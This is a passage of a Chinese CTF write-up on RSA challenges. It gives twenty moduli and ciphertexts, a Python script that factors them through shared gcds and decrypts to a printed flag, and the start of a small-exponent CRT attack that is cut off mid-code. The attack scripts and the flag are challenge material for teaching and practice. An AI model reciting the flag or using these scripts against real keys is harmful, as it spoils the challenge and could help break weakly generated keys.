20545487405816928731738988374475012686827933709789784391855706835136270270933401203019329136937650878386117187776530639342572123237188053978622697282521473917978282830432161153221216194169879669541998840691383025487220850872075436064308499924958517979727954402965612196081404341651517326364041519250125036424822634354268773895465698920883439222996581226358595873993976604699830613932320720554130011671297944433515047180565484495191003887599891289037982010216357831078328159028953222056918189365840711588671093333013117454034313622855082795813122338562446223041211192277089225078324682108033843023903550172891959673551</span><br><span class="line">c = 14227439188191029461250476692790539654619199888487319429114414557975376308688908028140817157205579804059783807641305577385724758530138514972962209062230576107406142402603484375626077345190883094097636019771377866339531511965136650567412363889183159616188449263752475328663245311059988337996047359263288837436305588848044572937759424466586870280512424336807064729894515840552404756879590698797046333336445465120445087587621743906624279621779634772378802959109714400516183718323267273824736540168545946444437586299214110424738159957388350785999348535171553569373088251552712391288365295267665691357719616011613628772175</span><br><span class="line"></span><br><span class="line">n = 27359727711584277234897157724055852794019216845229798938655814269460046384353568138598567755392559653460949444557879120040796798142218939251844762461270251672399546774067275348291003962551964648742053215424620256999345448398805278592777049668281558312871773979931343097806878701114056030041506690476954254006592555275342579529625231194321357904668512121539514880704046969974898412095675082585315458267591016734924646294357666924293908418345508902112711075232047998775303603175363964055048589769318562104883659754974955561725694779754279606726358588862479198815999276839234952142017210593887371950645418417355912567987</span><br><span class="line">c = 3788529784248255027081674540877016372807848222776887920453488878247137930578296797437647922494510483767651150492933356093288965943741570268943861987024276610712717409139946409513963043114463933146088430004237747163422802959250296602570649363016151581364006795894226599584708072582696996740518887606785460775851029814280359385763091078902301957226484620428513604630585131511167015763190591225884202772840456563643159507805711004113901417503751181050823638207803533111429510911616160851391754754434764819568054850823810901159821297849790005646102129354035735350124476838786661542089045509656910348676742844957008857457</span><br><span class="line"></span><br><span class="line">n = 27545937603751737248785220891735796468973329738076209144079921449967292572349424539010502287564030116831261268197384650511043068738911429169730640135947800885987171539267214611907687570587001933829208655100828045651391618089603288456570334500533178695238407684702251252671579371018651675054368606282524673369983034682330578308769886456335818733827237294570476853673552685361689144261552895758266522393004116017849397346259119221063821663280935820440671825601452417487330105280889520007917979115568067161590058277418371493228631232457972494285014767469893647892888681433965857496916110704944758070268626897045014782837</span><br><span class="line">c = 14069112970608895732417039977542732665796601893762401500878786871680645798754783315693511261740059725171342404186571066972546332813667711135661176659424619936101038903439144294886379322591635766682645179888058617577572409307484708171144488708410543462972008179994594087473935638026612679389759756811490524127195628741262871304427908481214992471182859308828778119005750928935764927967212343526503410515793717201360360437981322576798056276657140363332700714732224848346808963992302409037706094588964170239521193589470070839790404597252990818583717869140229811712295005710540476356743378906642267045723633874011649259842</span><br><span class="line"></span><br><span class="line">n = 25746162075697911560263181791216433062574178572424600336856278176112733054431463253903433128232709054141607100891177804285813783247735063753406524678030561284491481221681954564804141454666928657549670266775659862814924386584148785453647316864935942772919140563506305666207816897601862713092809234429096584753263707828899780979223118181009293655563146526792388913462557306433664296966331469906428665127438829399703002867800269947855869262036714256550075520193125987011945192273531732276641728008406855871598678936585324782438668746810516660152018244253008092470066555687277138937298747951929576231036251316270602513451</span><br><span class="line">c = 17344284860275489477491525819922855326792275128719709401292545608122859829827462088390044612234967551682879954301458425842831995513832410355328065562098763660326163262033200347338773439095709944202252494552172589503915965931524326523663289777583152664722241920800537867331030623906674081852296232306336271542832728410803631170229642717524942332390842467035143631504401140727083270732464237443915263865880580308776111219718961746378842924644142127243573824972533819479079381023103585862099063382129757560124074676150622288706094110075567706403442920696472627797607697962873026112240527498308535903232663939028587036724</span><br><span class="line"></span><br><span class="line">n = 23288486934117120315036919418588136227028485494137930196323715336208849327833965693894670567217971727921243839129969128783853015760155446770590696037582684845937132790047363216362087277861336964760890214059732779383020349204803205725870225429985939570141508220041286857810048164696707018663758416807708910671477407366098883430811861933014973409390179948577712579749352299440310543689035651465399867908428885541237776143404376333442949397063249223702355051571790555151203866821867908531733788784978667478707672984539512431549558672467752712004519300318999208102076732501412589104904734983789895358753664077486894529499</span><br><span class="line">c = 10738254418114076548071448844964046468141621740603214384986354189105236977071001429271560636428075970459890958274941762528116445171161040040833357876134689749846940052619392750394683504816081193432350669452446113285638982551762586656329109007214019944975816434827768882704630460001209452239162896576191876324662333153835533956600295255158377025198426950944040643235430211011063586032467724329735785947372051759042138171054165854842472990583800899984893232549092766400510300083585513014171220423103452292891496141806956300396540682381668367564569427813092064053993103537635994311143010708814851867239706492577203899024</span><br><span class="line"></span><br><span class="line">n = 19591441383958529435598729113936346657001352578357909347657257239777540424811749817783061233235817916560689138344041497732749011519736303038986277394036718790971374656832741054547056417771501234494768509780369075443550907847298246275717420562375114406055733620258777905222169702036494045086017381084272496162770259955811174440490126514747876661317750649488774992348005044389081101686016446219264069971370646319546429782904810063020324704138495608761532563310699753322444871060383693044481932265801505819646998535192083036872551683405766123968487907648980900712118052346174533513978009131757167547595857552370586353973</span><br><span class="line">c = 3834917098887202931981968704659119341624432294759361919553937551053499607440333234018189141970246302299385742548278589896033282894981200353270637127213483172182529890495903425649116755901631101665876301799865612717750360089085179142750664603454193642053016384714515855868368723508922271767190285521137785688075622832924829248362774476456232826885801046969384519549385428259591566716890844604696258783639390854153039329480726205147199247183621535172450825979047132495439603840806501254997167051142427157381799890725323765558803808030109468048682252028720241357478614704610089120810367192414352034177484688502364022887</span><br><span class="line"></span><br><span class="line">n = 19254242571588430171308191757871261075358521158624745702744057556054652332495961196795369630484782930292003238730267396462491733557715379956969694238267908985251699834707734400775311452868924330866502429576951934279223234676654749272932769107390976321208605516299532560054081301829440688796904635446986081691156842271268059970762004259219036753174909942343204432795076377432107630203621754552804124408792358220071862369443201584155711893388877350138023238624566616551246804054720492816226651467017802504094070614892556444425915920269485861799532473383304622064493223627552558344088839860178294589481899206318863310603</span><br><span class="line">c = 6790553533991297205804561991225493105312398825187682250780197510784765226429663284220400480563039341938599783346724051076211265663468643826430109013245014035811178295081939958687087477312867720289964506097819762095244479129359998867671811819738196687884696680463458661374310994610760009474264115750204920875527434486437536623589684519411519100170291423367424938566820315486507444202022408003879118465761273916755290898112991525546114191064022991329724370064632569903856189236177894007766690782630247443895358893983735822824243487181851098787271270256780891094405121947631088729917398317652320497765101790132679171889</span><br><span class="line"></span><br><span class="line">n = 26809700251171279102974962949184411136459372267620535198421449833298448092580497485301953796619185339316064387798092220298630428207556482805739803420279056191194360049651767412572609187680508073074653291350998253938793269214230457117194434853888765303403385824786231859450351212449404870776320297419712486574804794325602760347306432927281716160368830187944940128907971027838510079519466846176106565164730963988892400240063089397720414921398936399927948235195085202171264728816184532651138221862240969655185596628285814057082448321749567943946273776184657698104465062749244327092588237927996419620170254423837876806659</span><br><span class="line">c = 386213556608434013769864727123879412041991271528990528548507451210692618986652870424632219424601677524265011043146748309774067894985069288067952546139416819404039688454756044862784630882833496090822568580572859029800646671301748901528132153712913301179254879877441322285914544974519727307311002330350534857867516466612474769753577858660075830592891403551867246057397839688329172530177187042229028685862036140779065771061933528137423019407311473581832405899089709251747002788032002094495379614686544672969073249309703482556386024622814731015767810042969813752548617464974915714425595351940266077021672409858645427346</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n1 = <span class="number">20474918894051778533305262345601880928088284471121823754049725354072477155873778848055073843345820697886641086842612486541250183965966001591342031562953561793332341641334302847996108417466360688139866505179689516589305636902137210185624650854906780037204412206309949199080005576922775773722438863762117750429327585792093447423980002401200613302943834212820909269713876683465817369158585822294675056978970612202885426436071950214538262921077409076160417436699836138801162621314845608796870206834704116707763169847387223307828908570944984416973019427529790029089766264949078038669523465243837675263858062854739083634207</span></span><br><span class="line">c1 = <span class="number">974463908243330865728978769213595400782053398596897741316275722596415018912929508637393850919224969271766388710025195039896961956062895570062146947736340342927974992616678893372744261954172873490878805483241196345881721164078651156067119957816422768524442025688079462656755605982104174001635345874022133045402344010045961111720151990412034477755851802769069309069018738541854130183692204758761427121279982002993939745343695671900015296790637464880337375511536424796890996526681200633086841036320395847725935744757993013352804650575068136129295591306569213300156333650910795946800820067494143364885842896291126137320</span></span><br><span class="line"></span><br><span class="line">n2 = <span class="number">20918819960648891349438263046954902210959146407860980742165930253781318759285692492511475263234242002509419079545644051755251311392635763412553499744506421566074721268822337321637265942226790343839856182100575539845358877493718334237585821263388181126545189723429262149630651289446553402190531135520836104217160268349688525168375213462570213612845898989694324269410202496871688649978370284661017399056903931840656757330859626183773396574056413017367606446540199973155630466239453637232936904063706551160650295031273385619470740593510267285957905801566362502262757750629162937373721291789527659531499435235261620309759</span></span><br><span class="line">c2 = <span class="number">15819636201971185538694880505120469332582151856714070824521803121848292387556864177196229718923770810072104155432038682511434979353089791861087415144087855679134383396897817458726543883093567600325204596156649305930352575274039425470836355002691145864435755333821133969266951545158052745938252574301327696822347115053614052423028835532509220641378760800693351542633860702225772638930501021571415907348128269681224178300248272689705308911282208685459668200507057183420662959113956077584781737983254788703048275698921427029884282557468334399677849962342196140864403989162117738206246183665814938783122909930082802031855</span></span><br><span class="line"></span><br><span class="line">n3 = <span class="number">25033254625906757272369609119214202033162128625171246436639570615263949157363273213121556825878737923265290579551873824374870957467163989542063489416636713654642486717219231225074115269684119428086352535471683359486248203644461465935500517901513233739152882943010177276545128308412934555830087776128355125932914846459470221102007666912211992310538890654396487111705385730502843589727289829692152177134753098649781412247065660637826282055169991824099110916576856188876975621376606634258927784025787142263367152947108720757222446686415627479703666031871635656314282727051189190889008763055811680040315277078928068816491</span></span><br><span class="line">c3 = <span class="number">4185308529416874005831230781014092407198451385955677399668501833902623478395669279404883990725184332709152443372583701076198786635291739356770857286702107156730020004358955622511061410661058982622055199736820808203841446796305284394651714430918690389486920560834672316158146453183789412140939029029324756035358081754426645160033262924330248675216108270980157049705488620263485129480952814764002865280019185127662449318324279383277766416258142275143923532168798413011028271543085249029048997452212503111742302302065401051458066585395360468447460658672952851643547193822775218387853623453638025492389122204507555908862</span></span><br><span class="line"></span><br><span class="line">n4 = <span class="number">21206968097314131007183427944486801953583151151443627943113736996776787181111063957960698092696800555044199156765677935373149598221184792286812213294617749834607696302116136745662816658117055427803315230042700695125718401646810484873064775005221089174056824724922160855810527236751389605017579545235876864998419873065217294820244730785120525126565815560229001887622837549118168081685183371092395128598125004730268910276024806808565802081366898904032509920453785997056150497645234925528883879419642189109649009132381586673390027614766605038951015853086721168018787523459264932165046816881682774229243688581614306480751</span></span><br><span class="line">c4 = <span class="number">4521038011044758441891128468467233088493885750850588985708519911154778090597136126150289041893454126674468141393472662337350361712212694867311622970440707727941113263832357173141775855227973742571088974593476302084111770625764222838366277559560887042948859892138551472680654517814916609279748365580610712259856677740518477086531592233107175470068291903607505799432931989663707477017904611426213770238397005743730386080031955694158466558475599751940245039167629126576784024482348452868313417471542956778285567779435940267140679906686531862467627238401003459101637191297209422470388121802536569761414457618258343550613</span></span><br><span class="line"></span><br><span class="line">n5 = <span class="number">22822039733049388110936778173014765663663303811791283234361230649775805923902173438553927805407463106104699773994158375704033093471761387799852168337898526980521753614307899669015931387819927421875316304591521901592823814417756447695701045846773508629371397013053684553042185725059996791532391626429712416994990889693732805181947970071429309599614973772736556299404246424791660679253884940021728846906344198854779191951739719342908761330661910477119933428550774242910420952496929605686154799487839923424336353747442153571678064520763149793294360787821751703543288696726923909670396821551053048035619499706391118145067</span></span><br><span class="line">c5 = <span class="number">15406498580761780108625891878008526815145372096234083936681442225155097299264808624358826686906535594853622687379268969468433072388149786607395396424104318820879443743112358706546753935215756078345959375299650718555759698887852318017597503074317356745122514481807843745626429797861463012940172797612589031686718185390345389295851075279278516147076602270178540690147808314172798987497259330037810328523464851895621851859027823681655934104713689539848047163088666896473665500158179046196538210778897730209572708430067658411755959866033531700460551556380993982706171848970460224304996455600503982223448904878212849412357</span></span><br><span class="line"></span><br><span class="line">n6 = <span class="number">21574139855341432908474064784318462018475296809327285532337706940126942575349507668289214078026102682252713757703081553093108823214063791518482289846780197329821139507974763780260290309600884920811959842925540583967085670848765317877441480914852329276375776405689784571404635852204097622600656222714808541872252335877037561388406257181715278766652824786376262249274960467193961956690974853679795249158751078422296580367506219719738762159965958877806187461070689071290948181949561254144310776943334859775121650186245846031720507944987838489723127897223416802436021278671237227993686791944711422345000479751187704426369</span></span><br><span class="line">c6 = <span class="number">20366856150710305124583065375297661819795242238376485264951185336996083744604593418983336285185491197426018595031444652123288461491879021096028203694136683203441692987069563513026001861435722117985559909692670907347563594578265880806540396777223906955491026286843168637367593400342814725694366078337030937104035993569672959361347287894143027186846856772983058328919716702982222142848848117768499996617588305301483085428547267337070998767412540225911508196842253134355901263861121500650240296746702967594224401650220168780537141654489215019142122284308116284129004257364769474080721001708734051264841350424152506027932</span></span><br><span class="line"></span><br><span class="line">n7 = <span class="number">25360227412666612490102161131174584819240931803196448481224305250583841439581008528535930814167338381983764991296575637231916547647970573758269411168219302370541684789125112505021148506809643081950237623703181025696585998044695691322012183660424636496897073045557400768745943787342548267386564625462143150176113656264450210023925571945961405709276631990731602198104287528528055650050486159837612279600415259486306154947514005408907590083747758953115486124865486720633820559135063440942528031402951958557630833503775112010715604278114325528993771081233535247118481765852273252404963430792898948219539473312462979849137</span></span><br><span class="line">c7 = <span class="number">19892772524651452341027595619482734356243435671592398172680379981502759695784087900669089919987705675899945658648623800090272599154590123082189645021800958076861518397325439521139995652026377132368232502108620033400051346127757698623886142621793423225749240286511666556091787851683978017506983310073524398287279737680091787333547538239920607761080988243639547570818363788673249582783015475682109984715293163137324439862838574460108793714172603672477766831356411304446881998674779501188163600664488032943639694828698984739492200699684462748922883550002652913518229322945040819064133350314536378694523704793396169065179</span></span><br><span class="line"></span><br><span class="line">n8 = <span class="number">22726855244632356029159691753451822163331519237547639938779517751496498713174588935566576167329576494790219360727877166074136496129927296296996970048082870488804456564986667129388136556137013346228118981936899510687589585286517151323048293150257036847475424044378109168179412287889340596394755257704938006162677656581509375471102546261355748251869048003600520034656264521931808651038524134185732929570384705918563982065684145766427962502261522481994191989820110575981906998431553107525542001187655703534683231777988419268338249547641335718393312295800044734534761692799403469497954062897856299031257454735945867491191</span></span><br><span class="line">c8 = <span class="number">6040119795175856407541082360023532204614723858688636724822712717572759793960246341800308149739809871234313049629732934797569781053000686185666374833978403290525072598774001731350244744590772795701065129561898116576499984185920661271123665356132719193665474235596884239108030605882777868856122378222681140570519180321286976947154042272622411303981011302586225630859892731724640574658125478287115198406253847367979883768000812605395482952698689604477719478947595442185921480652637868335673233200662100621025061500895729605305665864693122952557361871523165300206070325660353095592778037767395360329231331322823610060006</span></span><br><span class="line"></span><br><span class="line">n9 = <span class="number">23297333791443053297363000786835336095252290818461950054542658327484507406594632785712767459958917943095522594228205423428207345128899745800927319147257669773812669542782839237744305180098276578841929496345963997512244219376701787616046235397139381894837435562662591060768476997333538748065294033141610502252325292801816812268934171361934399951548627267791401089703937389012586581080223313060159456238857080740699528666411303029934807011214953984169785844714159627792016926490955282697877141614638806397689306795328344778478692084754216753425842557818899467945102646776342655167655384224860504086083147841252232760941</span></span><br><span class="line">c9 = <span class="number">5418120301208378713115889465579964257871814114515046096090960159737859076829258516920361577853903925954198406843757303687557848302302200229295916902430205737843601806700738234756698575708612424928480440868739120075888681672062206529156566421276611107802917418993625029690627196813830326369874249777619239603300605876865967515719079797115910578653562787899019310139945904958024882417833736304894765433489476234575356755275147256577387022873348906900149634940747104513850154118106991137072643308620284663108283052245750945228995387803432128842152251549292698947407663643895853432650029352092018372834457054271102816934</span></span><br><span class="line"></span><br><span class="line">n10 = <span class="number">28873667904715682722987234293493200306976947898711255064125115933666968678742598858722431426218914462903521596341771131695619382266194233561677824357379805303885993804266436810606263022097900266975250431575654686915049693091467864820512767070713267708993899899011156106766178906700336111712803362113039613548672937053397875663144794018087017731949087794894903737682383916173267421403408140967713071026001874733487295007501068871044649170615709891451856792232315526696220161842742664778581287321318748202431466508948902745314372299799561625186955234673012098210919745879882268512656931714326782335211089576897310591491</span></span><br><span class="line">c10 = <span class="number">9919880463786836684987957979091527477471444996392375244075527841865509160181666543016317634963512437510324198702416322841377489417029572388474450075801462996825244657530286107428186354172836716502817609070590929769261932324275353289939302536440310628698349244872064005700644520223727670950787924296004296883032978941200883362653993351638545860207179022472492671256630427228461852668118035317021428675954874947015197745916918197725121122236369382741533983023462255913924692806249387449016629865823316402366017657844166919846683497851842388058283856219900535567427103603869955066193425501385255322097901531402103883869</span></span><br><span class="line"></span><br><span class="line">n11 = <span class="number">22324685947539653722499932469409607533065419157347813961958075689047690465266404384199483683908594787312445528159635527833904475801890381455653807265501217328757871352731293000303438205315816792663917579066674842307743845261771032363928568844669895768092515658328756229245837025261744260614860746997931503548788509983868038349720225305730985576293675269073709022350700836510054067641753713212999954307022524495885583361707378513742162566339010134354907863733205921845038918224463903789841881400814074587261720283879760122070901466517118265422863420376921536734845502100251460872499122236686832189549698020737176683019</span></span><br><span class="line">c11 = <span class="number">1491527050203294989882829248560395184804977277747126143103957219164624187528441047837351263580440686474767380464005540264627910126483129930668344095814547592115061057843470131498075060420395111008619027199037019925701236660166563068245683975787762804359520164701691690916482591026138582705558246869496162759780878437137960823000043988227303003876410503121370163303711603359430764539337597866862508451528158285103251810058741879687875218384160282506172706613359477657215420734816049393339593755489218588796607060261897905233453268671411610631047340459487937479511933450369462213795738933019001471803157607791738538467</span></span><br><span class="line"></span><br><span class="line">n12 = <span class="number">27646746423759020111007828653264027999257847645666129907789026054594393648800236117046769112762641778865620892443423100189619327585811384883515424918752749559627553637785037359639801125213256163008431942593727931931898199727552768626775618479833029101249692573716030706695702510982283555740851047022672485743432464647772882314215176114732257497240284164016914018689044557218920300262234652840632406067273375269301008409860193180822366735877288205783314326102263756503786736122321348320031950012144905869556204017430593656052867939493633163499580242224763404338807022510136217187779084917996171602737036564991036724299</span></span><br><span class="line">c12 = <span class="number">21991524128957260536043771284854920393105808126700128222125856775506885721971193109361315961129190814674647136464887087893990660894961612838205086401018885457667488911898654270235561980111174603323721280911197488286585269356849579263043456316319476495888696219344219866516861187654180509247881251251278919346267129904739277386289240394384575124331135655943513831009934023397457082184699737734388823763306805326430395849935770213817533387235486307008892410920611669932693018165569417445885810825749609388627231235840912644654685819620931663346297596334834498661789016450371769203650109994771872404185770230172934013971</span></span><br><span class="line"></span><br><span class="line">n13 = <span class="number">20545487405816928731738988374475012686827933709789784391855706835136270270933401203019329136937650878386117187776530639342572123237188053978622697282521473917978282830432161153221216194169879669541998840691383025487220850872075436064308499924958517979727954402965612196081404341651517326364041519250125036424822634354268773895465698920883439222996581226358595873993976604699830613932320720554130011671297944433515047180565484495191003887599891289037982010216357831078328159028953222056918189365840711588671093333013117454034313622855082795813122338562446223041211192277089225078324682108033843023903550172891959673551</span></span><br><span class="line">c13 = <span class="number">14227439188191029461250476692790539654619199888487319429114414557975376308688908028140817157205579804059783807641305577385724758530138514972962209062230576107406142402603484375626077345190883094097636019771377866339531511965136650567412363889183159616188449263752475328663245311059988337996047359263288837436305588848044572937759424466586870280512424336807064729894515840552404756879590698797046333336445465120445087587621743906624279621779634772378802959109714400516183718323267273824736540168545946444437586299214110424738159957388350785999348535171553569373088251552712391288365295267665691357719616011613628772175</span></span><br><span class="line"></span><br><span class="line">n14 = <span class="number">27359727711584277234897157724055852794019216845229798938655814269460046384353568138598567755392559653460949444557879120040796798142218939251844762461270251672399546774067275348291003962551964648742053215424620256999345448398805278592777049668281558312871773979931343097806878701114056030041506690476954254006592555275342579529625231194321357904668512121539514880704046969974898412095675082585315458267591016734924646294357666924293908418345508902112711075232047998775303603175363964055048589769318562104883659754974955561725694779754279606726358588862479198815999276839234952142017210593887371950645418417355912567987</span></span><br><span class="line">c14 = <span class="number">3788529784248255027081674540877016372807848222776887920453488878247137930578296797437647922494510483767651150492933356093288965943741570268943861987024276610712717409139946409513963043114463933146088430004237747163422802959250296602570649363016151581364006795894226599584708072582696996740518887606785460775851029814280359385763091078902301957226484620428513604630585131511167015763190591225884202772840456563643159507805711004113901417503751181050823638207803533111429510911616160851391754754434764819568054850823810901159821297849790005646102129354035735350124476838786661542089045509656910348676742844957008857457</span></span><br><span class="line"></span><br><span class="line">n15 = <span class="number">27545937603751737248785220891735796468973329738076209144079921449967292572349424539010502287564030116831261268197384650511043068738911429169730640135947800885987171539267214611907687570587001933829208655100828045651391618089603288456570334500533178695238407684702251252671579371018651675054368606282524673369983034682330578308769886456335818733827237294570476853673552685361689144261552895758266522393004116017849397346259119221063821663280935820440671825601452417487330105280889520007917979115568067161590058277418371493228631232457972494285014767469893647892888681433965857496916110704944758070268626897045014782837</span></span><br><span class="line">c15 = <span class="number">14069112970608895732417039977542732665796601893762401500878786871680645798754783315693511261740059725171342404186571066972546332813667711135661176659424619936101038903439144294886379322591635766682645179888058617577572409307484708171144488708410543462972008179994594087473935638026612679389759756811490524127195628741262871304427908481214992471182859308828778119005750928935764927967212343526503410515793717201360360437981322576798056276657140363332700714732224848346808963992302409037706094588964170239521193589470070839790404597252990818583717869140229811712295005710540476356743378906642267045723633874011649259842</span></span><br><span class="line"></span><br><span class="line">n16 = <span class="number">25746162075697911560263181791216433062574178572424600336856278176112733054431463253903433128232709054141607100891177804285813783247735063753406524678030561284491481221681954564804141454666928657549670266775659862814924386584148785453647316864935942772919140563506305666207816897601862713092809234429096584753263707828899780979223118181009293655563146526792388913462557306433664296966331469906428665127438829399703002867800269947855869262036714256550075520193125987011945192273531732276641728008406855871598678936585324782438668746810516660152018244253008092470066555687277138937298747951929576231036251316270602513451</span></span><br><span class="line">c16 = <span class="number">17344284860275489477491525819922855326792275128719709401292545608122859829827462088390044612234967551682879954301458425842831995513832410355328065562098763660326163262033200347338773439095709944202252494552172589503915965931524326523663289777583152664722241920800537867331030623906674081852296232306336271542832728410803631170229642717524942332390842467035143631504401140727083270732464237443915263865880580308776111219718961746378842924644142127243573824972533819479079381023103585862099063382129757560124074676150622288706094110075567706403442920696472627797607697962873026112240527498308535903232663939028587036724</span></span><br><span class="line"></span><br><span class="line">n17 = <span class="number">23288486934117120315036919418588136227028485494137930196323715336208849327833965693894670567217971727921243839129969128783853015760155446770590696037582684845937132790047363216362087277861336964760890214059732779383020349204803205725870225429985939570141508220041286857810048164696707018663758416807708910671477407366098883430811861933014973409390179948577712579749352299440310543689035651465399867908428885541237776143404376333442949397063249223702355051571790555151203866821867908531733788784978667478707672984539512431549558672467752712004519300318999208102076732501412589104904734983789895358753664077486894529499</span></span><br><span class="line">c17 = <span class="number">10738254418114076548071448844964046468141621740603214384986354189105236977071001429271560636428075970459890958274941762528116445171161040040833357876134689749846940052619392750394683504816081193432350669452446113285638982551762586656329109007214019944975816434827768882704630460001209452239162896576191876324662333153835533956600295255158377025198426950944040643235430211011063586032467724329735785947372051759042138171054165854842472990583800899984893232549092766400510300083585513014171220423103452292891496141806956300396540682381668367564569427813092064053993103537635994311143010708814851867239706492577203899024</span></span><br><span class="line"></span><br><span class="line">n18 = <span class="number">19591441383958529435598729113936346657001352578357909347657257239777540424811749817783061233235817916560689138344041497732749011519736303038986277394036718790971374656832741054547056417771501234494768509780369075443550907847298246275717420562375114406055733620258777905222169702036494045086017381084272496162770259955811174440490126514747876661317750649488774992348005044389081101686016446219264069971370646319546429782904810063020324704138495608761532563310699753322444871060383693044481932265801505819646998535192083036872551683405766123968487907648980900712118052346174533513978009131757167547595857552370586353973</span></span><br><span class="line">c18 = <span class="number">3834917098887202931981968704659119341624432294759361919553937551053499607440333234018189141970246302299385742548278589896033282894981200353270637127213483172182529890495903425649116755901631101665876301799865612717750360089085179142750664603454193642053016384714515855868368723508922271767190285521137785688075622832924829248362774476456232826885801046969384519549385428259591566716890844604696258783639390854153039329480726205147199247183621535172450825979047132495439603840806501254997167051142427157381799890725323765558803808030109468048682252028720241357478614704610089120810367192414352034177484688502364022887</span></span><br><span class="line"></span><br><span class="line">n19 = <span class="number">19254242571588430171308191757871261075358521158624745702744057556054652332495961196795369630484782930292003238730267396462491733557715379956969694238267908985251699834707734400775311452868924330866502429576951934279223234676654749272932769107390976321208605516299532560054081301829440688796904635446986081691156842271268059970762004259219036753174909942343204432795076377432107630203621754552804124408792358220071862369443201584155711893388877350138023238624566616551246804054720492816226651467017802504094070614892556444425915920269485861799532473383304622064493223627552558344088839860178294589481899206318863310603</span></span><br><span class="line">c19 = <span class="number">6790553533991297205804561991225493105312398825187682250780197510784765226429663284220400480563039341938599783346724051076211265663468643826430109013245014035811178295081939958687087477312867720289964506097819762095244479129359998867671811819738196687884696680463458661374310994610760009474264115750204920875527434486437536623589684519411519100170291423367424938566820315486507444202022408003879118465761273916755290898112991525546114191064022991329724370064632569903856189236177894007766690782630247443895358893983735822824243487181851098787271270256780891094405121947631088729917398317652320497765101790132679171889</span></span><br><span class="line"></span><br><span class="line">n20 = <span class="number">26809700251171279102974962949184411136459372267620535198421449833298448092580497485301953796619185339316064387798092220298630428207556482805739803420279056191194360049651767412572609187680508073074653291350998253938793269214230457117194434853888765303403385824786231859450351212449404870776320297419712486574804794325602760347306432927281716160368830187944940128907971027838510079519466846176106565164730963988892400240063089397720414921398936399927948235195085202171264728816184532651138221862240969655185596628285814057082448321749567943946273776184657698104465062749244327092588237927996419620170254423837876806659</span></span><br><span class="line">c20 = <span class="number">386213556608434013769864727123879412041991271528990528548507451210692618986652870424632219424601677524265011043146748309774067894985069288067952546139416819404039688454756044862784630882833496090822568580572859029800646671301748901528132153712913301179254879877441322285914544974519727307311002330350534857867516466612474769753577858660075830592891403551867246057397839688329172530177187042229028685862036140779065771061933528137423019407311473581832405899089709251747002788032002094495379614686544672969073249309703482556386024622814731015767810042969813752548617464974915714425595351940266077021672409858645427346</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">21</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i + <span class="number">1</span>, <span class="number">21</span>):</span><br><span class="line">        ni = <span class="built_in">eval</span>(<span class="string">&quot;n&quot;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">        nj = <span class="built_in">eval</span>(<span class="string">&quot;n&quot;</span> + <span class="built_in">str</span>(j))</span><br><span class="line">        p = gcd(ni, nj)</span><br><span class="line">        <span class="keyword">if</span> p &gt; <span class="number">1</span>:</span><br><span class="line">            c = <span class="built_in">eval</span>(<span class="string">&quot;c&quot;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">            q = ni // p</span><br><span class="line">            d = invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">            flag = long_to_bytes(<span class="built_in">pow</span>(c, d, ni))</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>flag{abdcbe5fd94e23b3de429223ab9c2fdf}</p><h3 id="爆破e"><a href="#爆破e" class="headerlink" title="爆破e"></a>爆破e</h3><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rsa</span>(<span class="params">n1, c1, n2, c2, n3, c3</span>):</span><br><span class="line">    M1 = n2 * n3</span><br><span class="line">    M2 = n1 * n3</span><br><span class="line">    M3 = n1 * n2</span><br><span class="line">    m_e = (c1 * M1 * invert(M1, n1) + c2 * M2 * invert(M2, n2) + c3 * M3 * invert(M3, n3)) % (n1 * n2 * n3)</span><br><span class="line">    <span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">        m = iroot(m_e, e)</span><br><span class="line">        <span class="keyword">if</span> m[<span 